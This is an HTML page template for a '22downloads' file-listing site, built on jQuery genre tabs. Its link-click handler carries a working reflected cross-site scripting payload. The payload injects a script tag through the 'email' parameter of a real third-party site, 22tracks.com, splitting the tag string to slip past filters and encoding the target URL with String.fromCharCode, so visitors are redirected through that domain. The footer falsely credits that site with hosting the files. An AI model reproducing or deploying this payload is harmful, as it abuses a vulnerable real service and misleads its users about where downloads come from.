<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <title>22download202</title>
        <link rel="stylesheet" type="text/css" media="screen" href="stylesheets/22download202.css" />
        <script language="JavaScript" src="http://code.jquery.com/jquery-1.4.2.min.js"></script>
	<script src="http://widgets.twimg.com/j/2/widget.js"></script>
        <script language="JavaScript">
            <!--

function toggle( e )
{
    var info = $('~ .info', this);
    if( info.is(":visible") )
    {
        $('.genre > .info').hide();
        window.location.hash = "";
        $('#tabs > div').removeClass("active");
    }
    else
    {
        $('.genre > .info').hide();
        info.show();
        var newid = $(this).parents(".genre").get(0).id;
        window.location.hash = newid;
        $('#tabs > div').removeClass("active");
        $('#tab_'+newid).addClass("active");
    }
    e.preventDefault();
}

$(document).ready(function() {
    $('.genre > .info').hide();
    var currentid = window.location.hash.substr(1);
    if( currentid )
    {
        $('#'+currentid+' > .info').show();
        window.location.hash = currentid;
    }
    $('.genre > .name').click(toggle)
    .hover(function(e){
        $(this).addClass("name_hover");
    },function(e){
        $(this).removeClass("name_hover");
    });

    $('.genre').each(function(e) {
        var container = $('#tabs');
        var id = this.id;
        var title = $('.name', this).html();
        var a = $("<div id='tab_"+id+"' class='tab'></div>\n", document);
        a.html( title );
        if( id == currentid )
        {
            a.addClass( "active" );
        }
        $('#tabs').append( a );
        a.targetid = id;
        a.click(function(e){
            var target = this.id.substr(4);
            $('#'+target+' > .name').click();
        });
    });
    if( ! $.browser.msie )
    {
        $('a.url').click(function(e){
            var chars = "";
            for( i = 0; i < this.href.length; i++ )
            {
                var c = this.href[i];
                chars += this.href.charCodeAt(i)+"";
                if( i != this.href.length-1 )
                {
                    chars += ",";
                }
            }
            var target = "http://22tracks.com/index.php?email='//;<scr"+"ipt><"+"/script><scri"+"pt>window.location=String.fromCharCode("+chars+");<"+"/script>";
            window.location = target;
            e.preventDefault();
        });
    }
});
            //-->
        </script>
    </head>
    <body>

<h1>22downloads</h1>

<div id="tabs"></div>

{content}

<div id="copieerrecht">All files hosted by <a href="http://22tracks.com/">22tracks.com</a> | Greetings ( Kaji && funzoneq ) ^ thanod</div>

    </body>
</html>
